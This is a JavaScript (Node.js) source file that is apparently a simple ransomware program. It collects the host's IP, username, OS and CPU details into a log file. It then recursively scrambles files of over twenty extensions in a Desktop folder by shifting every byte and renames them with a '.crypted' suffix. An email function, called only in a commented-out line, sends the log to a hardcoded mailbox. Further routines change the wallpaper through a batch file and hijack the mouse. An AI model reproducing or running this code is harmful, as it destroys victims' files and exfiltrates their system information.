/*
 * @Author: zwx492293 
 * @Date: 2017-12-09 14:20:21 
 * @Last Modified by: zhoushoujian
 * @Last Modified time: 2017-12-17 23:07:58
 */
const fs = require('fs')
const path = require('path')
const os = require('os')
const emailer = require("emailjs");
const child_process = require('child_process')
const year = new Date().getFullYear()
const month = new Date().getMonth() + 1
const day = new Date().getDate()
const hour = new Date().getHours()
const minute = new Date().getMinutes()
const second = new Date().getSeconds()
const time = `${year}-${month}-${day} ${hour}:${minute}:${second} `
const operationPlatform = process.platform  //获取操作系统平台，如win32
const operationCore = os.type()     //获取操作系统内核版本，如windows_NT
const operationArch = process.arch   //获取系统架构，如x64
const operationInfo = `${operationPlatform}_${operationCore}_${operationArch}`
const userName = process.env.USERPROFILE;
const fileFolderPath = `${userName}/Desktop/Email`
//获取ip地址
const networkInterfaces = os.networkInterfaces()
let address;
Object.keys(networkInterfaces).forEach(function (m) {
    for (const n in networkInterfaces[m]) {
        if (networkInterfaces[m][n].family === "IPv4" && networkInterfaces[m][n].address !== "127.0.0.1") {
            address = networkInterfaces[m][n].address;
            return address;
        }
    }
})
const cpuCoreNumber = os.cpus().length  //获取cpu核心（线程）
const cpuModel = os.cpus()[0].model    //获取cpu型号
const cpuSpeed = os.cpus()[0].speed;    //获取cpu主频
const cpuInfo = `${cpuModel}_${cpuCoreNumber} core_${cpuSpeed}MHZ`;
//打印日志模块
fs.appendFile("log.txt", `${time} \r\n ${operationInfo} \r\n ${address} \r\n ${userName} \r\n ${cpuInfo} `, {
    encoding: "utf8"
}, function () {
    console.log('process.pid-basic', process.pid)
});

// 加密这些类型的文件
const fileExtnames = [".jpg", ".bmp", ".zip", ".exe", ".mp3", ".wmv", ".doc", ".ppt", ".htm", ".png", ".gif", ".rar", ".txt", ".wma", ".mp4", ".xls", ".pdf", ".lnk", ".xlsx", ".docx", , ".pptx", ".html"]

encrypt(fileFolderPath)
    .then(function () {
        // email();
        // return setWallpaper(1);
    })

function encrypt(dst) {
    return new Promise(function (resolve, reject) {
        const promiseArr = [];
        fs.readdirSync(dst).forEach(function (files) {
            const targetPath = path.join(dst, files)
            if (!fileExtnames.some(item => path.extname(targetPath) === item)) {
                if (fs.statSync(targetPath).isDirectory()) {
                    return encrypt(targetPath);   //recursive call
                }
            } else {
                const promise = new Promise((res) => {
                    return fs.readFile(targetPath, (err, buffer) => {
                        //console.log("read",files);
                        if (err) {
                            console.error('readFile err', err)
                            return res()
                        }
                        const buf1 = Buffer.allocUnsafe(buffer.length);
                        for (let i = 0; i < buffer.length; i++) {
                            buf1[i] = buffer[i] + 5;
                        }
                        fs.writeFile(targetPath, buf1, function (err) {
                            // console.log("write",files);
                            const cryptedFile = `加密的文件${targetPath}`;
                            console.log("encrypted files", cryptedFile);
                            if (err) {
                                console.error('writeFile err', err)
                                return res()
                            }
                            const fileExtname = Buffer.from(path.extname(targetPath).slice(1, path.extname(targetPath).length));  //slice the ext of file not contains .
                            const extNameBuffer = Buffer.allocUnsafe(fileExtname.length)
                            for (let i = 0; i < fileExtname.length; i++) {
                                extNameBuffer[i] = fileExtname[i] - 3;
                            }
                            const newExtName = extNameBuffer.toString()   //new ext (string)
                            // let fileExtNameString = fileExtname.toString()   //origin ext (string)
                            const renameFiles = `${path.basename(targetPath, path.extname(targetPath))}${newExtName}` + `.crypted`;  //leave . at path.basename
                            console.log("rename", renameFiles);
                            fs.renameSync(targetPath, `${path.join(dst, renameFiles)}`)  //rename
                            //打印日志模块
                            fs.appendFile("log.txt", ` \r\n ${cryptedFile} `, {
                                encoding: "utf8"
                            }, function () {
                                res();
                            });
                        });
                    });
                });
                promiseArr.push(promise);
            }
        });
        Promise.all(promiseArr).then(function () {
            resolve();
        });
    })
}
function email() {
    const log = process.env.windir
    return new Promise(function (res) {
        console.log('email')
        const filePath = path.resolve(log, "log.txt")
        const server = emailer.server.connect({
            user: "863165094@qq.com",
            password: "your_password",
            host: "smtp.qq.com",
            ssl: true
        });

        const message = {
            text: `${address}`,
            from: "qianchengyimeng@qq.com",
            to: "863165094@qq.com",
            //cc:		"else <else@your-email.com>",
            subject: `${address}`,
            attachment:
                [
                    { data: "<html>永恒之爱</html>", alternative: true },
                    { path: filePath, type: "application/txt", name: "log.txt" }
                ]
        };
        server.send(message, function (err, message) {
            console.log("send email successfully!");
            setTimeout(function () {
                robotFunc()
            }, 500)
            res()
        })

    })
}

function setWallpaper(count) {
    console.log('setWallpaper')
    return new Promise(function (resolve) {
        let i = 1;
        function innerFunc() {
            setTimeout(function () {
                console.log('count: ', i);
                child_process.exec('fin.bat',
                    {
                        encoding: 'utf8',
                        timeout: 0,
                        maxBuffer: 10240 * 1024,
                        cwd: null,
                        env: null
                    },
                    function (error, stdout, stderr) {
                        i++;
                        if (i > count) {
                            resolve();
                            console.log("finish!");
                        } else {
                            return innerFunc();
                        }
                    });
            }, 300);
        }
        innerFunc();

    });
}

function robotFunc() {
    // Move the mouse across the screen as a sine wave.
    console.log('robotjs')
    try {
        const robot = require('robotjs');
        let n = 1;
        const mouse = function (n) {
            return new Promise(function (resolve) {
                //robot.setMouseDelay(1);
                const twoPI = Math.PI * 2;
                const screenSize = robot.getScreenSize();
                const height = (screenSize.height / 2) - 10;
                const width = screenSize.width;
                for (let x = 0; x < width; x++) {
                    y = height * Math.sin((twoPI * x) / width) + height;
                    robot.moveMouse(x, y);
                }
                resolve()
            }).then(function () {
                //robot.setMouseDelay(1);
                const twoPI = Math.PI * 2;
                const screenSize = robot.getScreenSize();
                const height = (screenSize.height / 2) - 10;
                const width = screenSize.width;
                for (let x = width; x > 0; x--) {
                    y = -height * Math.sin((twoPI * x) / width) + height;
                    robot.moveMouse(x, y);
                }
                m = n
                console.log(m)
                return mouse(--m)
            })
        }
        mouse(n)
    } catch (err) {
        console.error('robotFunc err', err)
    }
}








